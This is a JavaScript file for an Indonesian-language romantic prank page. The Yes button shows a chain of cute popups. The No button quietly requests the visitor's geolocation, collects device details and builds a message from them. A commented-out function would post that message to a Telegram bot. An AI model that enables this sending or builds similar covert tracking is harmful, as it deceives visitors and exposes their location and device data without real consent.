document.addEventListener('DOMContentLoaded', function () {
    const yesBtn = document.getElementById('yesBtn');
    const noBtn = document.getElementById('noBtn');

    yesBtn.addEventListener('click', showLoveMessage);
    noBtn.addEventListener('click', trackLocation);

    function showLoveMessage() {
        const scrollPosition = window.scrollY;
        Swal.fire({
            text: 'Arghhh g nyangka!',
            imageUrl: 'milk.gif',
            imageWidth: 150,
            imageHeight: 150,
            imageAlt: 'Arghhh g nyangka!',
            confirmButtonText: 'Okey',
        }).then(() => {
            const today = new Date().toLocaleDateString('id-ID');
            Swal.fire({
                text: `Inget ya hari ini tanggal jadian kita ${today}`,
                imageUrl: 'j&d-kitty.gif',
                imageWidth: 150,
                imageHeight: 150,
                imageAlt: `Inget ya hari ini tanggal jadian kita ${today}`,
                confirmButtonText: 'Okey'
            }).then(() => {
                Swal.fire({
                    text: 'Dua tiga buah langsat!!!',
                    imageUrl: 'peach-and-goma.gif',
                    imageWidth: 150,
                    imageHeight: 150,
                    imageAlt: 'Dua tiga buah langsat!!!',
                    confirmButtonText: 'Okey'
                }).then(() => {
                    Swal.fire({
                        imageUrl: 'peach-goma-peach.gif',
                        imageWidth: 150,
                        imageHeight: 150,
                        text: 'Kamu cantik sangatt>_<',
                        confirmButtonText: 'Okey'
                    }).then(() => {
                        Swal.fire({
                            imageUrl: 'bear-love.gif',
                            imageWidth: 150,
                            imageHeight: 150,
                            text: 'Kapan kita jalan?? kirim pesannya ke aku ya😘',
                            input: 'text',
                            inputPlaceholder: 'Enter your message here',
                            showCancelButton: true,
                            confirmButtonText: 'Send',
                            cancelButtonText: 'Cancel'
                        }).then((result) => {
                            if (result.isConfirmed) {
                                const message = result.value;
                                console.log('Message:', message);
                            }
                            window.scrollTo(0, scrollPosition);
                        });
                    });
                });
            });
        });
    };

    function trackLocation() {
        const scrollPosition = window.scrollY;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                displayLocationInfo(position);
                window.scrollTo(0, scrollPosition);
            }, showError);
        } else {
            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Geolocation tidak didukung oleh browser ini.',
            });
        }
    }

    function displayLocationInfo(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const deviceInfo = getDeviceInfo();

        Swal.fire({
            title: 'Location Information',
            html: `<strong>Latitude:</strong> ${latitude}<br>
                   <strong>Longitude:</strong> ${longitude}<br>
                   <strong>Device Information:</strong><br>${deviceInfo}`,
            imageUrl: 'peach-goma.gif',
            imageWidth: 100,
            imageHeight: 100,
            imageAlt: 'Cute Cat',
            confirmButtonText: 'Okey'
        });

        const message = `Location: ${latitude}, ${longitude}\nDevice Info: ${deviceInfo}`;
    }

    function getDeviceInfo() {
        const platform = navigator.platform;
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
        const userAgent = navigator.userAgent;
        return `Platform: ${platform}<br>RAM: ${ram}<br>User Agent: ${userAgent}`;
    }

    function showError(error) {
        Swal.fire({
            icon: 'error',
            title: 'Oops...',
            text: `Error: ${error.message}`,
        });
    }

    // function sendToTelegram(message) {
    //     const botToken = 'YOUR_BOT_TOKEN';
    //     const chatId = 'YOUR_CHAT_ID';
    //     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    //     const data = {
    //         chat_id: chatId,
    //         text: message
    //     };

    //     fetch(url, {
    //         method: 'POST',
    //         headers: {
    //             'Content-Type': 'application/json'
    //         },
    //         body: JSON.stringify(data)
    //     }).then(response => response.json())
    //         .then(data => console.log('Message sent:', data))
    //         .catch(error => console.error('Error:', error));
    // }
});
